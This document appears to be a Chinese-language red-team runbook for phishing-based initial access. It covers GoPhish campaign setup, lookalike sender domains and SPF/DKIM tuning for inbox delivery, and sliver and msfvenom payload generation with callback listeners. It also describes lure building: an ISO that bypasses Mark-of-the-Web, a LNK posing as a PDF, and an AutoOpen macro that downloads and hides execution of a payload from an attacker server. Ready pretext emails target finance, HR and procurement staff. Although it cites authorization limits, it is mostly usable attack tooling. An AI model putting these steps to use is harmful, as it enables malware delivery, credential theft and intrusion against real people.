## ① 链路总览 — 从目标画像到域内阶段 2

```text
[0 目标画像]      OSINT/文库/招聘站圈定:部门、岗位、邮件前缀格式、在用系统(见 01 号)
      │           产出:目标邮箱清单 CSV → 直接喂 GoPhish 用户组
      ▼
[1 基础设施]      相似仿冒发件域(⑥ 节)+ sliver 监听器(⑤ 节)+ http.server 分阶段下载
      │           顺序:监听器 → payload → 投递物 → 测试发件 → 正式活动
      ▼
[2 GoPhish 发送]  Sending Profile(SMTP)→ Email Template → Landing Page → Group → Campaign
      │           遥测:Email Opened / Clicked Link / Submitted Data(④ 节)
      ▼
[3 投递物落地]    三选一(③ 节):ISO=绕 MotW / LNK=伪装 PDF / 宏模板=远程下载二阶段
      │           附件名与话术按场景伪装:财务制度 / 简历 / 报价单
      ▼
[4 回连]         payload 按 generate 时写死的回连地址:8081/:8082 … 回 sliver(② 节)
      │           宏路径先经 python3 -m http.server 8080 下载(留下载日志,可归因)
      ▼
[5 sliver 上线]   sessions → use → info:拿到主机名/域/当前用户(⑤ 节)
      │           回连端口=波次 → 反查 GoPhish 点击记录 = 完整归因链
      ▼
[6 转域内阶段 2]  域内机器 → 10 号文档 阶段 2(域信息收集/凭据验证/横向);
                  落地件打包 ~/tools/bin/make-stage.sh,工具速查见 13 号
```

各步职责与产出对照:

| 步骤 | 在哪做 | 关键工具 | 产出/判据 |
|---|---|---|---|
| 0 画像 | 本机 | 01 号收集套件 | `targets.csv`(表头见 ④ 节) |
| 1 基础设施 | 本机 | sliver / http.server | `jobs` 在跑、8080 端口可下载 |
| 2 发送 | GoPhish | gophish-start | Campaign 状态 Sent,遥测开始累计 |
| 3 落地 | 目标机 | make-lure.sh 三件套 | 附件被打开/执行(见遥测+下载日志) |
| 4 回连 | 目标机→本机 | payload 自身 | sliver 端口出现连接 |
| 5 上线 | 本机 | sliver sessions | 新 session,`info` 出域信息 |
| 6 转段 | 本机 | 10 号 runbook | 进入域内主线 |

注意:顺序错了第一批点击就丢——**先起监听器与 http.server,再发邮件**;GoPhish 的 Clicked Link 只代表点击,不代表执行,上线判据以 sliver 会话为准(⑥ 节区分口径)。

## ② Payload 准备 — sliver 双格式 + msfvenom 备选(参数详见 03 号)

生成时机:监听器已起(⑤ 节)之后、make-lure.sh 之前——ISO 场景 payload 要直接进镜像,宏场景要上 http.server。

```bash
sliver-server                 # 启动服务端控制台(首次运行自动初始化 ~/.sliver;联网装扩展先设代理)
```

```bash
# ===== 以下命令在 sliver-server 控制台内执行 =====
# 主格式:EXE,直接进 ISO/下载目录,双击即回连(投递首选)
generate --os windows --arch amd64 --format exe --http <本机IP>:8081 --skip-symbols --save ~/tools/windows

# 备用格式:shellcode,塞自写加载器/宏二阶段,体积与特征更可控
generate --os windows --arch amd64 --format shellcode --http <本机IP>:8081 --skip-symbols --save ~/tools/windows
```

双格式取舍:

| 格式 | 用在哪 | 优点 | 代价 |
|---|---|---|---|
| `--format exe` | ISO 内直跑、宏/LNK 下载后执行 | 零依赖,链路短 | sliver 静态编译体积大(约 10MB+,见 03 号注意),附件/下载特征明显 |
| `--format shellcode` | 自写加载器、分阶段末段 | 小、可加密混淆 | 需要加载器落地,链路长一截 |

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<本机IP> LPORT=4444 -f exe -o ~/tools/windows/pay.exe
# msfvenom 备选(编码/加密/格式全表见 03 号,不在本文重复);接回连要先起 handler:
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <本机IP>; set LPORT 4444; run"
```

```bash
sha256sum ~/tools/windows/pay.exe     # 落台账:报告/溯源都要哈希(make-lure.sh 也会自动出 SHA256SUMS)
```

注意:`--http <本机IP>:8081` 的端口即回连端口,多波次分端口归因就靠它(⑤ 节);完整参数表(`--https/--mtls/--dns`、`--format` 全集、编码与免杀基础)一律查 [03-漏洞利用与C2.md](03-漏洞利用与C2.md),本文不重写。

## ③ 投递物三件套 — make-lure.sh(本机已实测)

```bash
~/tools/bin/make-lure.sh <payload.exe> [输出目录]          # 输出目录默认 ~/tools/lures/<时间戳>
# 例:先在 ~/tools/windows 里生成 payload,再打包三件套
cd ~/tools/windows && ~/tools/bin/make-lure.sh ./pay.exe ~/tools/lures/finance-wave1
```

产物清单(实测,输出目录内 4 个文件):

| 产物 | 内容 | 原理 |
|---|---|---|
| `<stem>.iso` | payload.exe + `启动.bat`(`start "" "%~dp0pay.exe"`,挂载盘根相对路径)+ `读我.txt` | mkisofs `-J` 中文长文件名,卷标 `Docs_<时间戳>`;挂载后双击 bat 即拉起同目录 payload |
| `<stem>.lnk` | 目标 `C:\Windows\System32\cmd.exe`,藏参 `/c start "" "<payload路径>"`,图标 `shell32.dll,70`(PDF 观感) | 双击"PDF"实为起 cmd 执行 |
| `<stem>-宏模板.bas` | `AutoOpen`:MSXML2.XMLHTTP 从 `http://<攻击机IP>:8080/pay.exe` 下载到 `%TEMP%` 并隐藏执行 | 宏只做下载器,payload 不嵌文档 |
| `SHA256SUMS.txt` | iso 与 lnk 的 sha256 | 交付校验/台账 |

三种伪装场景话术(投递物 × 邮件附件名 × 正文一句话):

| 场景 | 投递物 | 附件名样例 | 正文话术样例 |
|---|---|---|---|
| 财务制度更新 | ISO | `2026年Q3财务报销制度调整.iso` | "财务系统已升级,新版报销制度见附件,请挂载后双击 启动.bat 阅读生效说明,逾期未阅读将影响本月报销。" |
| 简历投递(打 HR) | LNK | `张伟-简历-产品经理.pdf.lnk` | "看到贵司在招产品经理,个人简历见附件,盼复。" |
| 报价单(打采购) | 宏模板 | `XX项目报价单-2026.docm` | "附件为加密报价单,请『启用内容』后查看完整版,价格有效期本周五。" |

Mark-of-the-Web(MotW)机制与 ISO 的绕过:

- **机制**:浏览器/邮件客户端下载的文件会附加 NTFS 备用流 `Zone.Identifier`(来源区 3),SmartScreen、受保护视图、宏拦截都依据这个标记发难——exe/bat 直接弹警告,宏默认禁用。
- **ISO 为什么绕过**:ISO 是容器,历史版本 Windows 挂载虚拟光驱时**不把 MotW 传播给容器内文件**——里面的 `启动.bat`/exe 无标记,SmartScreen 不弹,宏场景同理少一层拦截。**注意**:Win11 新版本对挂载 ISO/运行其中的 win32 程序已逐步加提示,"绕过"指不继承 MotW,不是永远零告警;投放前用目标实际系统版本靶测。
- **LNK/宏不依赖 MotW**:LNK 历史上不被 SmartScreen 拦截(代价是目标稍懂行就会看穿藏参);宏走 Office 信任中心,话术要点燃"启用内容"。

注意:①LNK 的启动参数是**生成时 payload 的绝对路径**(实测嵌入 `/c start "" "/tmp/payload-test.exe"` 式字符串)——生成时让文件名与交付包内一致、并用在你能控制解压路径的场景,交付前可用 `strings -e l <stem>.lnk` 复核参数;②宏模板下载地址 `<攻击机IP>:8080` 要与攻击机服务一致:`cd ~/tools/windows && python3 -m http.server 8080`;③ISO 里的 `启动.bat` 用 `%~dp0` 相对路径,挂载盘符任意都成立。

## ④ GoPhish 侧 — 发送配置、模板、落地页与用户组

```bash
sudo gophish-start          # systemd 拉起 gophish,管理面板 https://127.0.0.1:3333
```

**首启改密提醒**:初始口令 `admin / kali-gophish`(来自 systemd 单元 `GOPHISH_INITIAL_ADMIN_PASSWORD`),首次登录强制改密——新口令记入凭据台账,勿用弱口令:该面板能操控全部钓鱼活动与 harvested 凭据。

本机配置事实(`/etc/gophish/config.json`):管理面 `127.0.0.1:3333`(TLS,自签证书,浏览器告警正常);钓鱼页服务 `0.0.0.0:80` 明文 HTTP——若落地页要 HTTPS,改此文件补证书路径后重启服务;数据库 sqlite3 `/var/lib/gophish/gophish.db`。

**Sending Profile(发送配置)字段表**(逐一摘自本机包 `/usr/lib/gophish/templates/sending_profiles.html`):

| 界面字段 | 填什么 | 备注 |
|---|---|---|
| Name | `finance-relay-01` | 仅内部标识 |
| Interface Type | SMTP | 另有 SendGrid 接口类型 |
| SMTP From | `财务部 <finance@<发件域>>` | 显示名+地址,收件人肉眼所见 |
| Host | `smtp.<发件域>:587` | **必须带端口**;占位符样式见界面 `smtp.example.com:25` |
| Username / Password | 中继账号口令 | 直连目标 MX 时填匿名可用值 |
| Ignore Certificate Errors | 自签/内部中继才勾 | 公网商邮箱别勾 |
| Email Headers | 自定义 Header/Value | 伪装 `Message-ID`、加 `Reply-To` 常用 |
| Send Test Email | 先发到自家各邮箱 | 验证进箱率(SPF/DKIM 见 ⑥ 节)再开活动 |

**Email Template(邮件模板)写法**:字段 Name / Envelope Sender(信封发件人,可与显示 From 不同)/ Subject / Text|HTML 双栏编辑 / Add Tracking Image(打开遥测像素)/ Add Files(附件——ISO/LNK 场景在这里挂)。正文用合并标签个性化:`{{.FirstName}}`、`{{.LastName}}`、`{{.Position}}`、`{{.URL}}`(替换为带 rid 的追踪链接)、`{{.RId}}`(`{{.Email}}` 官方文档亦支持,以你实例预览为准)。

**Landing Page(落地页)写法**:字段 Name / Import Site(填 URL 直接抓目标真实登录页)/ HTML(手工改)/ Capture Submitted Data(勾选才记录表单提交)/ Capture Passwords(密码明文入库,界面自带红色警告,报告必须脱敏)/ Redirect to(提交后跳真站,降低怀疑)。凭据钓鱼:Import Site 抓真页 → 核对表单 action 指向钓鱼服务器(部分版本导入时自动改写;抓完在 HTML 里看一眼,没改就手工改/清空 action)→ 勾 Capture 两项 → Redirect to 真登录址。

**用户组导入 CSV 格式**:Users & Groups → New Group → Bulk Import Users;表头固定 `First Name,Last Name,Email,Position`(点 Download CSV Template 可直接下载模板,内容即下例):

```csv
First Name,Last Name,Email,Position
Wei,Zhang,wei.zhang@<目标域>,财务专员
Li,Wang,li.wang@<目标域>,人事主管
```

**Campaign(活动)把五件串起来**:Name / Email Template / Landing Page / URL(活动基础地址,`{{.URL}}` 由它生成)/ Launch Date / Send Emails By(可选,拖长发送降低风控敏感)/ Sending Profile / Groups → 先 Send Test Email → Launch Campaign。

注意:以上字段名与 CSV 表头均从本机安装包模板核出;GoPhish 版本更新后界面字段名以实例为准。

## ⑤ 上线处置 — sliver 监听器、分阶段与多目标归因

监听器端口选择(命令语法同 03 号;先起监听再生成 payload):

| 监听器 | 端口建议 | 场景 |
|---|---|---|
| `http` | 8081/8082…(实验与波次区分) | 靶场/内网明文,排障直观 |
| `https` | 443(`--persistent` 持久化) | 公网伪装成正常 TLS 流量,首选 |
| `mtls` | 8888 | 固定高信任链路,双向证书 |
| `dns` | 53 | 仅极端出网限制,慢(详见 03 号) |

```bash
# ===== sliver-server 控制台内 =====
http --lhost <本机IP> --lport 8081          # 波次 A(财务组)
http --lhost <本机IP> --lport 8082          # 波次 B(HR 组)
jobs                                        # 确认两个监听都在跑
```

implant 分阶段思路:

- **一段式**(ISO 直跑 exe):链路短、成功率高,附件大、特征多。
- **两段式**(宏/LNK 触发 → http.server 下载 exe 执行):邮件附件只有文档/快捷方式,首跳特征小;代价是下载服务与 C2 都要活。宏模板就是现成二阶段下载器:`cd ~/tools/windows && python3 -m http.server 8080`。
- 深度分阶段(加载器+shellcode、域前置)见 03 号 sliver 注意与 06 号隧道文档,不在本文展开。

多目标分端口判归因:

| 波次 | 用户组 | generate 回连 | 回连端口看到连接 ⇒ |
|---|---|---|---|
| A 财务制度 ISO | 财务组 | `--http <本机IP>:8081` | 8081 |
| B 简历 LNK | HR 组 | `--http <本机IP>:8082` | 8082 |

```bash
# ===== 上线后即做(控制台内)=====
sessions                    # 新会话出现:RemoteAddress 的端口即波次归属
use <会话ID>                # 切入
info                        # 主机名/所属域/当前用户——判断是否域内机器
shell                       # 掉原生 cmd 交互
```

归因交叉:sliver 回连端口(波次)× `info` 主机名(目标机)× http.server 下载日志(`<目标IP> - - "GET /pay.exe"`,宏波次)× GoPhish Clicked Link 记录——四源对齐才写报告。

注意:上线确认是**域内**机器后,凭据/枚举/横向转 [10-域渗透一条龙.md](10-域渗透一条龙.md) 阶段 2,Windows 落地件用 `~/tools/bin/make-stage.sh` 打包(见 13 号);`~/.sliver/` 下证书与配置等同 C2 控制权,严禁进报告/截图(03 号原话)。

## ⑥ OPSEC — 域名、SPF/DKIM、遥测区分与授权边界

**发件域名:相似仿冒,而非同域**:

- 同域发送(`finance@<目标域>`)需要控制对方的 SPF/DKIM 授权与中继——那是已经拿下邮件基础设施之后的事(15 号 Exchange 路线),初始入口阶段做不到,硬伪造必被 DMARC 拦。
- 正确姿势:注册**相似域**(`<目标域>` ↔ 换字 `m↔rn`、`l↔1`、`o↔0`,加后缀 `-portal`/`-secure`,换 TLD),自己配 MX/SPF/DKIM,邮件"看起来像"而不是"真的是"。GoPhish 的 SMTP From 用这个域。
- 风险:相似域可能触商标/反不正当竞争条款,域名与用途要写进授权文书。

**SPF/DKIM 对进箱率的影响**:

- 无 SPF:对方 MTA 可直接拒收;发件域 DNS 要有 `v=spf1 ip4:<GoPhish出口IP> -all`。
- DKIM:GoPhish 经 SMTP 中继发送时由**中继**负责签名;直连目标 MX 则无人签名——要高进箱率就走支持 DKIM 的中继(或自建 postfix+opendkim),且 d= 对齐发件域。
- DMARC `p=reject` 的目标侧对齐失败会直接丢弃;上线前用 Send Test Email 发 Gmail/QQ/163 各一枚看进箱,再开正式活动。

**点击遥测 ≠ 上线,汇报口径分层**(GoPhish 状态名摘自本机包 `campaign_results` 模板):

| 漏斗层 | 数据源 | 陷阱 |
|---|---|---|
| Email Sent / Opened | GoPhish 追踪像素 | 邮件客户端**预览即触发** Opened,天然虚高 |
| Clicked Link | GoPhish `{{.URL}}` 点击 | 点了≠执行:安全网关代爬、用户秒关都算点击 |
| Submitted Data | 落地页表单 | 仅凭据钓鱼场景有 |
| **上线(真正落地)** | **sliver sessions + http.server 下载日志** | 唯一执行成功判据 |

**法律授权边界**:只打书面授权(SOW/ROE)明确允许钓鱼的目标——范围条款写清:目标邮箱清单、允许的仿冒对象与话术、凭据使用边界(钓到的密码只能登授权系统)、数据留存与销毁(捕获凭据加密存储、报告脱敏)、结束清理(GoPhish 活动/落地页下线、C2 会话关闭)。域外邮箱、个人邮箱、以及清单外同事转发波及的第三者一律不碰;越界的"顺手"是事故,不是战果。
